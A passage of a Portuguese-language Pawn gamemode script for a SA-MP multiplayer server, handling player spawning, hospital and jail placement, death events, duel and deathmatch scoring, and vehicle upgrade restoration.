					pInfo[playerid][Continuar] = true;
					ContinTimer[playerid] = SetTimerEx("ComandoVoltar", 20000, false, "d", playerid);
					SetPlayerArmas(playerid);
					//PCar_PlayerConnect(playerid);
				}
			    if(pInfo[playerid][Level] == 0 && pInfo[playerid][Prof] == DESEMPREGADO)
			    {
		        	RemovePlayerMapIcon(playerid, 90);
		        	SendClientMessage(playerid, AZUL_WE, "A agência de empregos foi marcada em seu mapa!");
			   		SendClientMessage(playerid, VERMELHO_WE, "A agência de empregos fica no prédio a sua frente, vá até lá.");
			   		SetPlayerMapIcon(playerid, 90, 1310.3708,-1370.8752,13.5204, 53,0,MAPICON_GLOBAL_CHECKPOINT);
				}
				if(pInfo[playerid][Spawn] == 1)
				{
					if(pInfo[playerid][Prof] == POL_CIVIL || pInfo[playerid][Prof] == POL_MILITAR || pInfo[playerid][Prof] == POL_FEDERAL || pInfo[playerid][Prof] == GUARDA_TRANSITO || pInfo[playerid][Prof] == POL_RODOVIARIO)
					{
						spawnPolicia(playerid);
					}
					else
					{
						SpawnCasa(playerid);
					}
				}
				else
				{
					SpawnProf(playerid);
				}
	  			SetColor(playerid);
				getarVIP(playerid);
				ultimoLogin(playerid);

				if(WE_GetInt(f(playerid), "msglucro") == 1)
				{
					msglucrooff(playerid, WE_GetInt(f(playerid), "Contratado"));
				}

				/*for(new gz = 0; gz < sizeof(ZoneInfo); gz++)
				{
				    GangZoneShowForPlayer(playerid, ZoneID[gz], SetVehCorName(ZoneInfo[gz][zCor][0]));

				    if(ZonaAtacada[gz] != -1) GangZoneFlashForPlayer(playerid, ZoneID[gz], ZoneInfo[gz][zCor][1]);
				}*/

				GangZoneShowForPlayer(playerid, AreasGZServer[0], 0x00000055);
			    GangZoneShowForPlayer(playerid, AreasGZServer[1], 0x00000055);
			    GangZoneShowForPlayer(playerid, AreasGZServer[2], 0x00000055);
			    GangZoneShowForPlayer(playerid, AreasGZServer[3], 0x00000055);
			    GangZoneShowForPlayer(playerid, AreasGZServer[4], 0x00000055);
			    GangZoneShowForPlayer(playerid, AreasGZServer[5], 0x00000055);
			    GangZoneShowForPlayer(playerid, AreasGZServer[6], 0x00000055);
			    GangZoneShowForPlayer(playerid, AreasGZServer[7], 0x00000055);
			}
	   		else
	   		{
			   	if(pInfo[playerid][Hosp] == 0)
				{
					SetPlayerPos(playerid, 1173.1145,-1323.7125,15.3962);
					SetPlayerFacingAngle(playerid, 268.1490);
					SetCameraBehindPlayer(playerid);
					pInfo[playerid][Hosp] = -1;
					MensagemHospital(playerid);
				}
				else if(pInfo[playerid][Hosp] == 1)
				{
					SetPlayerPos(playerid, 2036.5521,-1412.5513,16.9922);
					SetPlayerFacingAngle(playerid, 135.5749);
					SetCameraBehindPlayer(playerid);
					pInfo[playerid][Hosp] = -1;
					MensagemHospital(playerid);
				}
				else if(pInfo[playerid][Hosp] == 2)
				{
					SetPlayerPos(playerid, 1607.4396,1819.1462,10.8280);
					SetPlayerFacingAngle(playerid, 359.6572);
					SetCameraBehindPlayer(playerid);
					pInfo[playerid][Hosp] = -1;
					MensagemHospital(playerid);
				}
				else if(pInfo[playerid][Hosp] == 3)
				{
					SetPlayerPos(playerid, -2665.0503,636.5155,14.4531);
					SetPlayerFacingAngle(playerid, 177.0288);
					SetCameraBehindPlayer(playerid);
					pInfo[playerid][Hosp] = -1;
					MensagemHospital(playerid);
				}
			    else if(pInfo[playerid][Hosp] == 4)
				{
	                SetPlayerPos(playerid, -315.0838,1050.7095,20.3403);
	                SetPlayerFacingAngle(playerid, 359.3905);
					SetCameraBehindPlayer(playerid);
					pInfo[playerid][Hosp] = -1;
					MensagemHospital(playerid);
				}
				else if(pInfo[playerid][Hosp] == 5)
				{
	                SetPlayerPos(playerid, -1514.6455,2523.4263,55.8138);
	                SetPlayerFacingAngle(playerid, 359.6804);
					SetCameraBehindPlayer(playerid);
					pInfo[playerid][Hosp] = -1;
					MensagemHospital(playerid);
				}
				else if(pInfo[playerid][Hosp] == 6)
				{
	                SetPlayerPos(playerid, -2208.2485,-2286.8516,30.6250);
	                SetPlayerFacingAngle(playerid, 319.4752);
					SetCameraBehindPlayer(playerid);
					pInfo[playerid][Hosp] = -1;
					MensagemHospital(playerid);
				}
	  			else if(pInfo[playerid][Hosp] == 7)
				{
					GameTextForPlayer(playerid, "~p~~h~SPAWN FAVELA", 1000, 1);
	                SetPlayerPos(playerid, 2216.8623, -1178.4064, 25.7266);
	                SetPlayerFacingAngle(playerid, 2.1799);
					SetCameraBehindPlayer(playerid);
					pInfo[playerid][Hosp] = -1;
				}
				else if(pInfo[playerid][Hosp] == 8)
				{
				    GameTextForPlayer(playerid, "~b~~h~SPAWN RC", 1000, 1);
				  	SetPlayerPos(playerid, -1132.2523, 1028.9613, 1345.7339);
		   			SetPlayerFacingAngle(playerid, 272.8925);
		   			SetPlayerInterior(playerid, 10);
		     		GivePlayerWeapon(playerid, 31, 99999);
					GivePlayerWeapon(playerid, 24, 99999);
					GivePlayerWeapon(playerid, 29, 99999);
					GivePlayerWeapon(playerid, 27, 99999);
					GivePlayerWeapon(playerid, 34, 99999);
					pInfo[playerid][Hosp] = -1;
				}
				else if(pInfo[playerid][Hosp] == 9)
				{
		  			if(epDM[playerid][dmParticipando] == 1 && esDM[evdmCriado] == 1)
		  			{
		       			if(esDM[evdmArenaID] == 6)
					    {
							SetPlayerPos(playerid, dmePos[0], dmePos[1], dmePos[2]);
							SetPlayerInterior(playerid, 0);
						}
					    else if(esDM[evdmArenaID] > 0 && esDM[evdmArenaID] < 6)
		       			{
					        if(esDM[evdmArenaID] == 1)
					        {
					            new rnd = random(sizeof(saeArena1));
								SetPlayerPos(playerid, saeArena1[rnd][0], saeArena1[rnd][1], saeArena1[rnd][2]);
								SetPlayerFacingAngle(playerid, saeArena1[rnd][3]);
								SetPlayerInterior(playerid, intArena[esDM[evdmArenaID]][0]);
							}
							if(esDM[evdmArenaID] == 2)
					        {
					            new rnd = random(sizeof(saeArena2));
								SetPlayerPos(playerid, saeArena2[rnd][0], saeArena2[rnd][1], saeArena2[rnd][2]);
								SetPlayerFacingAngle(playerid, saeArena2[rnd][3]);
								SetPlayerInterior(playerid, intArena[esDM[evdmArenaID]][0]);
							}
							if(esDM[evdmArenaID] == 3)
					        {
					            new rnd = random(sizeof(saeArena3));
								SetPlayerPos(playerid, saeArena3[rnd][0], saeArena3[rnd][1], saeArena3[rnd][2]);
								SetPlayerFacingAngle(playerid, saeArena3[rnd][3]);
								SetPlayerInterior(playerid, intArena[esDM[evdmArenaID]][0]);
							}
							if(esDM[evdmArenaID] == 4)
					        {
					            new rnd = random(sizeof(saeArena4));
								SetPlayerPos(playerid, saeArena4[rnd][0], saeArena4[rnd][1], saeArena4[rnd][2]);
								SetPlayerFacingAngle(playerid, saeArena4[rnd][3]);
								SetPlayerInterior(playerid, intArena[esDM[evdmArenaID]][0]);
							}
							if(esDM[evdmArenaID] == 5)
					        {
					            new rnd = random(sizeof(saeArena5));
								SetPlayerPos(playerid, saeArena5[rnd][0], saeArena5[rnd][1], saeArena5[rnd][2]);
								SetPlayerFacingAngle(playerid, saeArena5[rnd][3]);
								SetPlayerInterior(playerid, intArena[esDM[evdmArenaID]][0]);
							}
						}
						dmSetEquipamentos(playerid);
					}
				}
			}
			armasProf(playerid);
		}
		else
		{
		    if(pInfo[playerid][pLogin] == true)
		    {
			    pInfo[playerid][pLogin] = false;
			    pInfo[playerid][Continuar] = false;

				format(gStr, sizeof(gStr), "Seu último login foi {FFFFFF}%s às %s", WE_GetString(f(playerid), "ulData"), WE_GetString(f(playerid), "ulHorario"));
				SendClientMessage(playerid, COR_AMARELO, gStr);

				SendClientMessage(playerid, COR_ERRO, "Você está preso(a), continuará na cadeia até que sua pena acabe!");
				SendClientMessage(playerid, COR_AMARELO, "Você não pode continuar da sua última posição salva.");

				SetPrisao(playerid);
				SetColor(playerid);
				getarVIP(playerid);
				ultimoLogin(playerid);
				//PCar_PlayerConnect(playerid);

				if(WE_GetInt(f(playerid), "msglucro") == 1)
				{
					msglucrooff(playerid, WE_GetInt(f(playerid), "Contratado"));
				}

				GangZoneShowForPlayer(playerid, AreasGZServer[0], 0x00000055);
				GangZoneShowForPlayer(playerid, AreasGZServer[1], 0x00000055);
				GangZoneShowForPlayer(playerid, AreasGZServer[2], 0x00000055);
				GangZoneShowForPlayer(playerid, AreasGZServer[3], 0x00000055);
				GangZoneShowForPlayer(playerid, AreasGZServer[4], 0x00000055);
				GangZoneShowForPlayer(playerid, AreasGZServer[5], 0x00000055);
				GangZoneShowForPlayer(playerid, AreasGZServer[6], 0x00000055);
				GangZoneShowForPlayer(playerid, AreasGZServer[7], 0x00000055);
			}
			if(pInfo[playerid][procMorto] == true)
			{
			    Prender(playerid);
			    pInfo[playerid][procMorto] = false;
			}
			if(pInfo[playerid][Preso] > 0)
			{
			    Prender(playerid);
			}
		}
		/* Verificação do Relógio UP */
		if(pInfo[playerid][R_UP_ON_OFF] == 1)
		{
			TextDrawShowForPlayer(playerid, TextLevelUP[playerid]);
		}
		else if(pInfo[playerid][R_UP_ON_OFF] == 0)
		{
	 		TextDrawHideForPlayer(playerid, TextLevelUP[playerid]);
		}
		citylocal_textplayer_update(playerid);
		/* Text Draws */
		TextDrawShowForPlayer(playerid, InfoLevel[playerid]);
		TextDrawHideForPlayer(playerid, WE_GAMES1);
		TextDrawHideForPlayer(playerid, WE_GAMES2);
		TextDrawHideForPlayer(playerid, LoginScreen[0]);
		TextDrawHideForPlayer(playerid, LoginScreen[1]);
		TextDrawHideForPlayer(playerid, LoginScreen[2]);
		TextDrawHideForPlayer(playerid, LoginScreen[3]);
		TextDrawHideForPlayer(playerid, LoginScreen[4]);
		TextDrawHideForPlayer(playerid, LoginScreen[5]);
		TextDrawHideForPlayer(playerid, LoginScreen[6]);
		TextDrawHideForPlayer(playerid, LoginScreen[7]);
		TextDrawHideForPlayer(playerid, BoxCarregando);
		TextDrawHideForPlayer(playerid, Flash);
		TextDrawShowForPlayer(playerid, Relogio);
		TextDrawShowForPlayer(playerid, Data);
		TextDrawShowForPlayer(playerid, InfoSite);
		TextDrawShowForPlayer(playerid, RDinheiro);
		TextDrawShowForPlayer(playerid, Barra1);
		TextDrawShowForPlayer(playerid, Barra2);
		TextDrawShowForPlayer(playerid, Barra3);
		TextDrawShowForPlayer(playerid, TextNomeServer);
		TextDrawShowForPlayer(playerid, TextNomeSite);
		SetarItensPlayer(playerid);
		pInfo[playerid][Treinando] = false;
		/* Limpar Variável Duelo */
		ArenaDuelo[playerid] = false;
		ClickMause[playerid] = 0;
		SetPlayerCheckPoint[playerid] = 0;
		ParticipandoEvento[playerid] = 0;
		SetCameraBehindPlayer(playerid);

		if(pInfo[playerid][fardado] == 1)
		{
			if(pInfo[playerid][Prof] == POL_CIVIL)
			{
				SetPlayerSkin(playerid, 281);
			}
			if(pInfo[playerid][Prof] == POL_MILITAR)
			{
				SetPlayerSkin(playerid, 280);
			}
			if(pInfo[playerid][Prof] == POL_FEDERAL)
			{
				SetPlayerSkin(playerid, 286);
			}
			if(pInfo[playerid][Prof] == POL_RODOVIARIO)
			{
				SetPlayerSkin(playerid, 282);
			}
			if(pInfo[playerid][Prof] == GUARDA_TRANSITO)
			{
				SetPlayerSkin(playerid, 71);
			}
		}
	 	else
	 	{
			new
		 		getSkin = WE_GetInt(f(playerid), "Skin")
	 		;
			if(!SkinValida(getSkin))
		 	{
		 	    SetPlayerSkin(playerid, getSkin);
		 	}
		 	else
		 	{
				if(pInfo[playerid][PLAYER_VIP] == 1 || aInfo[playerid][Admin] == 1 || aInfo[playerid][Moderador] == 1)
			 	{
			 	    SetPlayerSkin(playerid, getSkin);
			 	    /*SetPlayerSkillLevel(playerid,0,999);
	                SetPlayerSkillLevel(playerid, 4, 999);
	                SetPlayerSkillLevel(playerid, 6, 999);*/
			 	}
				else
				{
					if(pInfo[playerid][PLAYER_VIP] == 0 || aInfo[playerid][Admin] == 0 || aInfo[playerid][Moderador] == 0)
			 		{
				 	    if(pInfo[playerid][Sexo] == 1)
				 	    {
				 	    	SetPlayerSkin(playerid, 0);
						}
		   				if(pInfo[playerid][Sexo] == 2)
				        {
				            SetPlayerSkin(playerid, 10);
				        }
			 		}
				}
			}
		}
	 	if(gelarSpawn[playerid] == false)
	 	{
			TogglePlayerControllable(playerid, true);
		}
	 	PlayerPlaySound(playerid, 1184,0,0.0, 0.0);
		/*if(HabsVIP[playerid] == true)
		{
			SetPlayerSkillLevel(playerid,0,999);
	        SetPlayerSkillLevel(playerid, 4, 999);
	        SetPlayerSkillLevel(playerid, 6, 999);
		}
		else {
	    SetPlayerSkillLevel(playerid,0,1);
	    SetPlayerSkillLevel(playerid, 4, 1);
	    SetPlayerSkillLevel(playerid, 6, 1);
	    }*/
	}
	return 1;
}

public OnPlayerDeath(playerid, killerid, reason)
{
	//Auto-Escola
	if(InAutoEscola[playerid] == 1)
    {
        new currentveh;
        currentveh = GetPlayerVehicleID(playerid);
        DestroyVehicle(currentveh);
        InAutoEscola[playerid] = 0;
        DisablePlayerRaceCheckpoint(playerid);
    }
	if(InAutoEscola2[playerid] == 1)
    {
        new currentveh;
        currentveh = GetPlayerVehicleID(playerid);
        DestroyVehicle(currentveh);
        InAutoEscola2[playerid] = 0;
        DisablePlayerRaceCheckpoint(playerid);
    }
	if(InAutoEscola3[playerid] == 1)
    {
        new currentveh;
        currentveh = GetPlayerVehicleID(playerid);
        DestroyVehicle(currentveh);
        InAutoEscola3[playerid] = 0;
        DisablePlayerRaceCheckpoint(playerid);
    }
	if(InAutoEscola4[playerid] == 1)
    {
        new currentveh;
        currentveh = GetPlayerVehicleID(playerid);
        DestroyVehicle(currentveh);
        InAutoEscola4[playerid] = 0;
        DisablePlayerRaceCheckpoint(playerid);
    }
	if(InAutoEscola5[playerid] == 1)
    {
        new currentveh;
        currentveh = GetPlayerVehicleID(playerid);
        DestroyVehicle(currentveh);
        InAutoEscola5[playerid] = 0;
        DisablePlayerRaceCheckpoint(playerid);
    }
	if(InAutoEscola6[playerid] == 1)
    {
        new currentveh;
        currentveh = GetPlayerVehicleID(playerid);
        DestroyVehicle(currentveh);
        InAutoEscola6[playerid] = 0;
        DisablePlayerRaceCheckpoint(playerid);
    }
    format(gFile, sizeof(gFile), "Contas/%s.ini", PlayerName(playerid));
	WE_SetInt(gFile, "GranadaGas", 0);
	WE_SetInt(gFile, "Granada", 0);
	WE_SetInt(gFile, "Pistola_9mm", 0);
	WE_SetInt(gFile, "Pistola_S9mm", 0);
	WE_SetInt(gFile, "Pistola_Emm", 0);
	WE_SetInt(gFile, "Shotgun", 0);
	WE_SetInt(gFile, "CombatShotgun", 0);
	WE_SetInt(gFile, "MP5", 0);
	WE_SetInt(gFile, "AK47", 0);
	WE_SetInt(gFile, "M4", 0);
	WE_SetInt(gFile, "Rifle", 0);
	WE_SetInt(gFile, "Sniper", 0);
	WE_SetInt(gFile, "SocoIngles", 0);
	WE_SetInt(gFile, "TacoGolf", 0);
	WE_SetInt(gFile, "Cacetete", 0);
	WE_SetInt(gFile, "Faca", 0);
	WE_SetInt(gFile, "Baseball", 0);
	WE_SetInt(gFile, "Inchada", 0);
	WE_SetInt(gFile, "TacoBilhar", 0);
	WE_SetInt(gFile, "Katana", 0);
	WE_SetInt(gFile, "SerraEletrica", 0);
	WE_SetInt(gFile, "Spray", 0);
	WE_SetInt(gFile, "Camera", 0);
	WE_SetInt(gFile, "Paraquedas", 0);
	WE_SaveFile();
	pInfo[playerid][Treinando] = false;
	//Basquete
	HavingBall[playerid] = 0;
	if(HavingBall[playerid]) Baller = 999;
	SetPlayerInterior(playerid, 0);
	SetPlayerVirtualWorld(playerid, 0);
//------------------------------ FomeSedeSono ----------------------------------
	if(mFome[playerid] == true)
	{
		SetStatusBar(playerid, BAR_FOME, Player_barEat[playerid], 7);
		SetPVarInt(playerid,"Fome", 7);
		mFome[playerid] = false;
	}
	if(mSede[playerid] == true)
	{
		SetStatusBar(playerid, BAR_SEDE, Player_barDrink[playerid], 10);
		SetPVarInt(playerid,"Sede", 10);
		mSede[playerid] = false;
	}
//--------------------------------- FSS ----------------------------------------
	if(pdeaths[playerid] == 0)
	{
        death[playerid] = gettime();
        pdeaths[playerid] = 1;
    }
	else if(pdeaths[playerid] == 1)
	{
        new
			time = gettime() - death[playerid]
		;
        if(time < 2)
		{
            BanEx(playerid, "Fake Kill");
        }
		else
		{
			pdeaths[playerid] = 0;
		}
    }
    TextDrawHideForPlayer(playerid, Data);
    TextDrawHideForPlayer(playerid, Relogio);
    TextDrawHideForPlayer(playerid, Zones[playerid]);
    TextDrawHideForPlayer(playerid, Flash);
    TextDrawHideForPlayer(playerid, Barra1);
    TextDrawHideForPlayer(playerid, Barra2);
    TextDrawHideForPlayer(playerid, Barra3);
    TextDrawHideForPlayer(playerid, GPSLocal);
	if(WE_GetInt(f(playerid), "Seguro") == 0 && pInfo[playerid][Level] > 10)
    {
        sResetPlayerCash(playerid);
    }
	if(killerid == INVALID_PLAYER_ID)
	{
		if(ArenaDuelo[playerid] == true)
		{
			/*format(gStr, sizeof(gStr), "(ANTI-DM) %s suicidou-se na arena de duelos.", PlayerName(playerid));
			SendClientMessageToAll(-1, gStr);*/
			pInfo[playerid][Hosp] = 4;
			DentroDuelo = 0;
			IDX1 = -1;
			foreach(Player, i)
			{
				if(ArenaDuelo[i] == true)
				{
					SetPlayerVirtualWorld(i, 0);
					SetPlayerInterior(i, 0);
					SetPlayerPos(i, 2131.4861, -973.9576, 59.7856);
					SetPlayerFacingAngle(i, 2.1799);
					SetCameraBehindPlayer(i);
					ArenaDuelo[i] = false;
					TogglePlayerControllable(i, true);
					SetPlayerHealth(playerid, LifeDuelo[i]);
				}
			}
		}
	}
	if(ArenaDuelo[playerid] == true || EventoDM == true || IsPlayerInPlace(killerid, 2059.889648, -1158.775512, 2299.889648, -958.775512))
	{
		pInfo[killerid][fMatou] += 1;
		pInfo[playerid][fMorreu] += 1;
	    if(!IsPlayerInPlace(killerid, 2059.889648, -1158.775512, 2299.889648, -958.775512) && !IsPlayerInPlace(playerid, 2059.889648, -1158.775512, 2299.889648, -958.775512))
	    {
			if(ArenaDuelo[playerid] == true)
			{
				if(ArenaDuelo[playerid] == true && ArenaDuelo[killerid] == true)
				{
					new
						Float:vida
					;
					GetPlayerHealth(killerid, vida);
				    ArenaDuelo[playerid] = false;
				    ArenaDuelo[killerid] = false;
				    pInfo[playerid][Hosp] = 7;
			 		SetPlayerPos(killerid, 2131.4861, -973.9576, 59.7856);
					SetCameraBehindPlayer(killerid);
					ResetPlayerWeapons(playerid);
					ResetPlayerWeapons(killerid);
					SetPlayerArmas(playerid);
					DentroDuelo = 0;
					IDX1 = -1;
					return 1;
				}
			}
		}
		else
		{
			pInfo[playerid][Hosp] = 7;
			if(pInfo[killerid][Prof] == ATIRADOR)
			{
			    SendClientMessage(killerid, AZUL_WE, "Você recebeu R$200 reais pelo assassinato!");
			    sGivePlayerCash(killerid, 200);
			}
		}
	}
	else
	{
		if(killerid != INVALID_PLAYER_ID)
		{
			if(esDM[evdmCriado] == 0 && epDM[playerid][dmParticipando] == 0 && epDM[killerid][dmParticipando] == 0 && !getPolicial(killerid))
			{
			    SetPlayerWantedLevel(killerid, GetPlayerWantedLevel(killerid) + 1);
        		foreach(Player, i)
        		{
					if(pInfo[i][Prof] == GUARDA_TRANSITO || pInfo[i][Prof] == POL_CIVIL || pInfo[i][Prof] == POL_MILITAR || pInfo[i][Prof] == POL_RODOVIARIO || pInfo[i][Prof] == POL_FEDERAL || pInfo[i][Prof] == EXERCITO || aInfo[i][Admin] == 1)
		   			{
						SendClientFormat(i, VERMELHO_WE, "O(A) criminoso(a) %s assassinou %s!", PlayerName(killerid), PlayerName(playerid));
					}
				}
				if(ComBolsa[playerid] == true)
				{
				    RemovePlayerAttachedObject(playerid, 3);
				    ComBolsa[playerid] = false;
				}
				if(GetPlayerWantedLevel(killerid) >= 6)
				{
				    SetPlayerWantedLevel(killerid, 6);
				}
				if(GameRC[killerid] == 1)
				{
					pInfo[playerid][Hosp] = 8;
				}
				if(epDM[playerid][dmParticipando] == 1)
				{
					pInfo[playerid][Hosp] = 9;
				}
				if((esDM[evdmCriado] == 1) && (epDM[playerid][dmParticipando] == 1) && (epDM[killerid][dmParticipando] == 1))
       			{
			    	epDM[killerid][dm_Matou] += 1;
			        epDM[playerid][dm_Morreu] += 1;
			  		format(gStr, 128, "~n~~n~~b~~h~Morreu para~w~~h~%s~n~seu k/d~n~~w~Matou ~r~%d ~w~Morreu ~b~%d", PlayerName(killerid), epDM[playerid][dm_Matou], epDM[playerid][dm_Morreu]);
					GameTextForPlayer(playerid, gStr, 3000, 5);
					format(gStr, 128, "~n~~n~~n~~b~~h~Matou ~w~~h~%s~n~seu k/d~n~~w~Matou ~r~%d ~w~Morreu ~b~%d", PlayerName(playerid), epDM[killerid][dm_Matou], epDM[killerid][dm_Morreu]);
					GameTextForPlayer(killerid, gStr, 2000, 5);
					TogglePlayerSpectating(playerid, true);
					PlayerSpectatePlayer(playerid, killerid);
					SetTimerEx("PlayerSpectatingFalse", 3000, false, "d", playerid);
			    }
			}
 			else
			{
   				if(pInfo[killerid][Preso] > 0)
			    {
					SendClientMessage(killerid, COR_ERRO, "Você assassinou um(a) jogador(a) inocente enquanto está preso(a)!");
					SendClientMessage(killerid, COR_ERRO, "Seu tempo preso(a) será extendido em 7,5 minutos!");
					pInfo[killerid][Preso] = pInfo[killerid][Preso] + 450;
			    }
			    else
			    {
			        if(modoP == 0)
			        {
			            new
			                p = GetPlayerWantedLevel(playerid)
						;
			            if(getPolicial(killerid) && pInfo[killerid][fardado] == 1 && p > 0)
			            {
			            	format(gstring, sizeof(gstring), "O(A) oficial %s executou e prendeu o(a) fugitivo(a) %s!", PlayerName(killerid), PlayerName(playerid));
							SendClientMessageToAll(AZUL_WE, gstring);
							pPatente[killerid] += 1;
               				pInfo[playerid][procMorto] = true;
               				if(ComBolsa[playerid] == true)
               				{
               				    RemovePlayerAttachedObject(playerid, 3);
               				    ComBolsa[playerid] = false;
							}
						}
						else
						{
	                        SetPlayerWantedLevel(killerid, GetPlayerWantedLevel(killerid) + 1);
		           			if(GetPlayerWantedLevel(killerid) > 6)
							{
							    SetPlayerWantedLevel(killerid, 6);
							}
							format(gStr, sizeof(gStr), "(ANTI-DM) O(A) policial %s foi preso(a) por assassinar um inocente!", PlayerName(killerid));
							SendClientMessageToAll(0xFFFFFFAA, gStr);
							pInfo[killerid][fMatou] -= 1;
							Prender(killerid);
							if(ComBolsa[playerid] == true)
							{
							    RemovePlayerAttachedObject(playerid, 3);
							    ComBolsa[playerid] = false;
							}
						}
					}
				}
			}
		}
	}
	if(ArenaDuelo[playerid] == true || IsPlayerInPlace(playerid, 2059.889648, -1158.775512, 2299.889648, -958.775512) || GameRC[playerid] == 1 || epDM[playerid][dmParticipando] == 1)
	{
	    if(ArenaDuelo[playerid] == true || IsPlayerInPlace(playerid, 2059.889648, -1158.775512, 2299.889648, -958.775512))
	    {
			pInfo[playerid][Hosp] = 7; // Spawn Favela
		}
		if(GameRC[playerid] == 1)
		{
		    pInfo[playerid][Hosp] = 8; // Spawn RC
		}
		if(epDM[playerid][dmParticipando] == 1)
		{
		    pInfo[playerid][Hosp] = 9;
		}
	}
	else
	{
		if(GetPlayerHospital(playerid) == 0)
		{
			pInfo[playerid][Hosp] = 0; SetHospital(playerid);
		}
		else if(GetPlayerHospital(playerid) == 1)
		{
			pInfo[playerid][Hosp] = 1; SetHospital(playerid);
		}
		else if(GetPlayerHospital(playerid) == 2)
		{
			pInfo[playerid][Hosp] = 2; SetHospital(playerid);
		}
		else if(GetPlayerHospital(playerid) == 3)
		{
			pInfo[playerid][Hosp] = 3; SetHospital(playerid);
		}
		else if(GetPlayerHospital(playerid) == 4)
		{
			pInfo[playerid][Hosp] = 4; SetHospital(playerid);
		}
 		else if(GetPlayerHospital(playerid) == 5)
		{
			pInfo[playerid][Hosp] = 5; SetHospital(playerid);
		}
 		else if(GetPlayerHospital(playerid) == 6)
	    {
			pInfo[playerid][Hosp] = 6; SetHospital(playerid);
		}
	}
	//--
	if(GPS[playerid])
	{
		KillTimer(T_GPS[playerid]);
		GPS[playerid] = false;
		T_GPS[playerid] = 0;
	}
	ResetPlayerWeapons(playerid);
	if(epDM[playerid][dmParticipando] == 0)
    {
		GameTextForPlayer(playerid, "~w~Morto", 1000, 0);
	}
	pHospital[playerid] = gettime() + 15;
	return 1;
}

//-------------------------------- FomeSedeSono --------------------------------
/*forward SalvarFSS(playerid);
public SalvarFSS(playerid)
{
	format(arquivos2, sizeof(arquivos2), PastaFSS, PlayerName(playerid));
	if(WE_FileExists(arquivos2))
	{

		WE_SetInt(arquivos2, "Fome", GetPVarInt(playerid,"Fome"));
		WE_SetInt(arquivos2, "Sede", GetPVarInt(playerid,"Sede"));
		WE_SetInt(arquivos2, "Sono", GetPVarInt(playerid,"Sono"));
		WE_SaveFile();
	}
	return 1;
}*/
//------------------------------------ FSS -------------------------------------

forward PlayerSpectatingFalse(playerid);
public PlayerSpectatingFalse(playerid)
{
	TogglePlayerSpectating(playerid, false);
	return SpawnPlayer(playerid);
}

stock SetHospital(playerid)
{
	if(pInfo[playerid][PLAYER_VIP] != 1 && aInfo[playerid][Admin] != 1 && aInfo[playerid][Moderador] != 1 && aInfo[playerid][Ajudante] != 1 && epDM[playerid][dmParticipando] == 0)
	{
		new Random = random(sizeof(MortoCama));
		TogglePlayerControllable(playerid, false);
		SetPlayerPos(playerid, MortoCama[Random][0], MortoCama[Random][1], MortoCama[Random][2]);
		SetPlayerFacingAngle(playerid, MortoCama[Random][3]);
		SetPlayerCameraPos(playerid, 308.84,249.67,999.98);
		SetPlayerCameraLookAt(playerid, MortoCama[Random][0], MortoCama[Random][1], MortoCama[Random][2]);
		ApplyAnimation(playerid, "CRACK", "crckdeth2", 4.0, 1, 0, 0, 0, 0);
		CountTimerHospital[playerid] = SetTimerEx("HospitalCountdown", 1000, false, "d", playerid);
		CountHospital[playerid] = 10;
	}
}

forward HospitalCountdown(playerid);
public HospitalCountdown(playerid)
{
    format(gstring, sizeof(gstring), "~w~~h~Hospital~n~~r~~h~Os medicos estao lhe tratando~n~~w~~h~Aguarde...%d", CountHospital[playerid]);
    GameTextForPlayer(playerid, gstring, 1500, 3);

    if(CountHospital[playerid] <= 0)
    {
        SendClientMessage(playerid, AZUL_WE, "Você se recuperou e está em ótimo estado para voltar a sua rotina.");
		SetPlayerHealth(playerid, 100.0);
		SetCameraBehindPlayer(playerid);
		TogglePlayerControllable(playerid, true);
		ClearAnimations(playerid);
    }
    if(CountHospital[playerid] > 0)
    {
        CountHospital[playerid] --;
        CountTimerHospital[playerid] = SetTimerEx("HospitalCountdown", 1000, false, "d", playerid);
	}
	return 1;
}

public OnVehicleSpawn(vehicleid)
{
    vHouse[vehicleid] = 0;
	if(EUmCarro(vehicleid))
	{
		for(new c; c < sizeof(cInfo); ++c)
		{
			if(vehicleid == cInfo[c][HouseCar])
			{
				if(cInfo[CasaInfo[c][Numero]][t_Nitro] != -1 && cInfo[CasaInfo[c][Numero]][t_Nitro] != 0)
				{
				    if(IsVehicleUpgradeCompatible(GetVehicleModel(vehicleid), cInfo[CasaInfo[c][Numero]][t_Nitro]))
				    {
			    		AddVehicleComponent(cInfo[CasaInfo[c][Numero]][HouseCar], cInfo[CasaInfo[c][Numero]][t_Nitro]);
			    	}
				}
				if(cInfo[CasaInfo[c][Numero]][t_Roda] != -1 && cInfo[CasaInfo[c][Numero]][t_Roda] != 0)
				{
				    if(IsVehicleUpgradeCompatible(GetVehicleModel(vehicleid), cInfo[CasaInfo[c][Numero]][t_Roda]))
				    {
			    		AddVehicleComponent(cInfo[CasaInfo[c][Numero]][HouseCar], cInfo[CasaInfo[c][Numero]][t_Roda]);
			    	}
			    }
	   			if(cInfo[CasaInfo[c][Numero]][t_Spoiler] != -1 || cInfo[CasaInfo[c][Numero]][t_Spoiler] != 0)
				{
				    if(IsVehicleUpgradeCompatible(GetVehicleModel(vehicleid), cInfo[CasaInfo[c][Numero]][t_Spoiler]))
				    {
			    		AddVehicleComponent(cInfo[CasaInfo[c][Numero]][HouseCar], cInfo[CasaInfo[c][Numero]][t_Spoiler]);
			    	}
				}
			    if(cInfo[CasaInfo[c][Numero]][t_Hydraulico] != -1 || cInfo[CasaInfo[c][Numero]][t_Hydraulico] != 0)
				{
				    if(IsVehicleUpgradeCompatible(GetVehicleModel(vehicleid), cInfo[CasaInfo[c][Numero]][t_Hydraulico]))
				    {
			    		AddVehicleComponent(cInfo[CasaInfo[c][Numero]][HouseCar], cInfo[CasaInfo[c][Numero]][t_Hydraulico]);
			    	}
				}
				if(cInfo[CasaInfo[c][Numero]][t_ParachoqueDianteiro] != -1 || cInfo[CasaInfo[c][Numero]][t_ParachoqueDianteiro] != 0)
				{
				    if(IsVehicleUpgradeCompatible(GetVehicleModel(vehicleid), cInfo[CasaInfo[c][Numero]][t_ParachoqueDianteiro]))
				    {
			    		AddVehicleComponent(cInfo[CasaInfo[c][Numero]][HouseCar], cInfo[CasaInfo[c][Numero]][t_ParachoqueDianteiro]);
			    	}
				}
				if(cInfo[CasaInfo[c][Numero]][t_ParachoqueTraseiro] != -1 || cInfo[CasaInfo[c][Numero]][t_ParachoqueTraseiro] != 0)
				{
				    if(IsVehicleUpgradeCompatible(GetVehicleModel(vehicleid), cInfo[CasaInfo[c][Numero]][t_ParachoqueTraseiro]))
				    {
			    		AddVehicleComponent(cInfo[CasaInfo[c][Numero]][HouseCar], cInfo[CasaInfo[c][Numero]][t_ParachoqueTraseiro]);
			    	}
				}
